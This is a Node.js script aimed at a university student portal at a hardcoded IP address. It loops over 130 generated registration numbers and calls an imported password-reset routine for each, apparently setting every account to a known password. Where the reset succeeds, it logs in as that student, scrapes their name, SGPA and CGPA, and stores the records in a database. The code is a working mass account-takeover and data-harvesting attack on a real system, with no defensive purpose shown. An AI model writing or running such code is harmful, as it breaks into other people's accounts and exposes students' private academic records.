const axios = require("axios");
const qs = require("qs");
const cheerio = require("cheerio");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });
const cgpamodel = require("./cgmodel")
const solve4 = require("./Forgetpass")
let cookieenv = process.env.COOKIE;



const solve3 = async (token, sem) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField: "",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE: token,
    ddlSemester: sem,
    hfIdno: "16219",
    "btnimgShowResult.x": "15",
    "btnimgShowResult.y": "14",
    hdfidno: "",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/default.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: cookieenv,
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/default.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res3 = response.data;

    // Use cheerio to load the HTML response
    const $ = cheerio.load(res3);

    // Extract desired values using selectors
    let regnnumber = $("#txtRegno").text().trim();
    let name = $("#lblStudentName").text().trim();
    let cgpa = $("#lblCPI").text().trim();
    let sgpa = $("#lblSPI").text().trim();
    return { success: true, regnnumber, name, cgpa ,sgpa,Sem : sem};
  } catch (error) {
    console.error(error);
    return { success: false, message: "Error occurred" };
  }
};

const solve2 = async (regn) => {
  let config = {
    method: "get",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/default.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      Connection: "keep-alive",
      Cookie: cookieenv,
      Referer: "http://202.168.87.90/StudentPortal/Login.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
  };

  try {
    const response = await axios.request(config);
    const res = response.data;

    // Use a regular expression to find the __VIEWSTATE value
    const viewStateMatch = res.match(
      /<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)" \/>/
    );
    let s
    if(regn.includes("2021")) s = 8
    else if(regn.includes("2022")) s = 6
    else if(regn.includes("2023")) s = 4
    else if(regn.includes("2024")) s = 2
    else s = 8
    if (viewStateMatch && viewStateMatch[1]) {
      const finalresult = await solve3(viewStateMatch[1],s);
      return finalresult;
    } else {
      return null;
    }
  } catch (error) {
    console.error(error);
    return null;
  }
};

const solve = async (regn) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField:
      ";;AjaxControlToolkit, Version=3.0.20229.20843, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:en-US:3b7d1b28-161f-426a-ab77-b345f2c428f5:e2e86ef9:1df13a87:8ccd9c1b",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE:
      "/wEPDwUKLTQyNTE2MDAwMQ8WAh4JaXBBZGRyZXNzBQ4xNTIuNTguMTMyLjE5NWRkXBXfk5yprzdMiWwWi+eD3Oh7yl0=",
    txt_username: regn,
    text_water_ClientState: "",
    txt_password: `${process.env.PASSWORD}`,
    Text_Water2_ClientState: "",
    btnSubmit: "Login",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/Login.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: cookieenv,
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/Login.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res = response.data;
    if (!res.includes(regn)) return { success: false, message: "Invalid Application Number" , regn};
    let res2 = await solve2(regn);
    return res2;
  } catch (error) {
    console.error(error);
    return `Error occurred for ${regn}`;
  }
};
const solveforall = async () => {
    let years = ["2022"];
    let branches = ["CS"];
    for (let year of years) {
      for (let branch of branches) {
        for (let roll = 1; roll <= 130; roll++) {
          let rollStr = roll.toString().padStart(3, "0");
          let applicationnumber = `${year}UG${branch}${rollStr}`;
          let r1 = await solve4(applicationnumber)
          if(r1.includes("Password Modified"))
          {
            const resp =await solve(applicationnumber);
            if(resp.success){
              await cgpamodel.create({
                  Regn : resp.regnnumber,
                  Name : resp.name,
                  Cgpa : resp.cgpa,
                  Sgpa : resp.sgpa
              })
              console.log(`${resp.regnnumber} : ${resp.name} - (sem : ${resp.Sem} , SGPA : ${resp.sgpa} , CGPA : ${resp.cgpa}) saved in database`)
            }
            else console.log(`Error Fetching result for ${resp.regn}`)
          }
          else console.log(`Invalid Regn no ${applicationnumber}`)
        }
      }
    }
  };
  
// solveforall();

module.exports = solveforall;
